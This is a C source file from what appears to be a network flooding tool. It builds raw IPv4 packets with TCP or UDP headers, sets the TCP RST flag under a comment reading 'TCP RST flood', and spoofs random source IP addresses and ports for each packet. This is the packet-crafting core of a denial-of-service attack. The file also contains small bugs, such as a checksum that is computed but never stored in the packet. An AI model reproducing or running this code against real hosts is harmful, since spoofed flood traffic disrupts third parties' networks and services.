
#include "packets_settings.h"

// ---- PACKET HEADER BEGIN ---- //
unsigned short
checksum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((__u_char *)&oddbyte) = *(__u_char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    return (short)~sum;
}
struct iphdr generate_ipv4hdr(struct packet *packet) {
    struct iphdr iph;
    iph.version = 4;
    iph.ihl = 5;
    iph.ttl = 20;
    iph.saddr = inet_addr(packet->source_ip_address);
    iph.daddr = inet_addr(packet->target_ip_address);
    iph.protocol = packet->protocol;
    iph.tot_len = (packet->protocol == IPPROTO_UDP) ? IPHDR_SZ + +sizeof(struct udphdr) : IPHDR_SZ + sizeof(struct tcphdr);

    return iph;
}
struct tcphdr generate_tcphdr(struct packet *packet) {
    struct tcphdr tcph;
    tcph.source = htons(packet->source_port);
    tcph.dest = htons(packet->target_port);
    tcph.seq = 0;
    tcph.ack_seq = 0;
    tcph.doff = 5;
    tcph.fin = 0;
    tcph.syn = 0;
    tcph.rst = 1;  // ---- TCP RST flood
    tcph.ack = 0;
    tcph.window = htons(5840);
    tcph.check = 0;
    tcph.urg_ptr = 0;

    return tcph;
}
struct udphdr generate_udphdr(struct packet *packet) {
    struct udphdr udp;
    udp.uh_sport = htons(packet->source_port);
    udp.uh_dport = htons(packet->target_port);
    udp.uh_ulen = htons(sizeof(struct udphdr));

    return udp;
}
struct udp_pseudo_header generate_pudphdr(struct packet *packet) {
    struct udp_pseudo_header psh;
    psh.source_address = inet_addr(packet->source_ip_address);
    psh.dest_address = inet_addr(packet->target_ip_address);
    psh.placeholder = 0;
    psh.protocol = IPPROTO_UDP;
    psh.udp_length = htons(sizeof(struct udphdr));

    return psh;
}
void create_udp_header(char *pkt, struct packet *packet) {
    struct udphdr udp = generate_udphdr(packet);

    struct udp_pseudo_header psh = generate_pudphdr(packet);

    memcpy(&psh.udp, &udp, sizeof(struct udphdr));
    udp.check = checksum((unsigned short *)&psh, sizeof(struct udp_pseudo_header));
    memcpy(pkt + sizeof(struct iphdr), &udp, sizeof(struct udphdr));
}
struct tcp_pseudo_header generate_phdr(struct packet *packet) {
    struct tcp_pseudo_header psh;
    psh.source_address = inet_addr(packet->source_ip_address);
    psh.dest_address = inet_addr(packet->target_ip_address);

    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr));

    return psh;
}
void create_tcp_header(char *pkt, struct packet *packet) {
    struct tcphdr tcph = generate_tcphdr(packet);
    struct tcp_pseudo_header psh = generate_phdr(packet);

    memcpy(&psh.tcp, &tcph, sizeof(struct tcphdr));
    tcph.check = checksum((unsigned short *)&psh, sizeof(struct tcp_pseudo_header));
    memcpy(pkt + sizeof(struct iphdr), &tcph, sizeof(struct tcphdr));
}

// ---- PACKET HEADER END ---- //

// ---- GENERATE RANDOM VALUES ---- //
void generate_values(char *ip_buff, __u_int *port) {
    sprintf(ip_buff, "%d.%d.%d.%d", rand() & 0xFF, rand() & 0xFF, rand() & 0xFF, rand() & 0xFF);
    *port = (rand() & 0xFFFF);
}

// ---- PACKET CREATION ---- //
void create_packet(char *pkt, struct packet *settings) {
    struct iphdr iph = generate_ipv4hdr(settings);
    generate_values(settings->source_ip_address, &settings->source_port);
    memcpy(pkt, &iph, sizeof(struct iphdr));

    (settings->protocol == IPPROTO_UDP) ? create_udp_header(pkt, settings) : create_tcp_header(pkt, settings);
    iph.check = checksum((unsigned short *)pkt, iph.tot_len >> 1);
}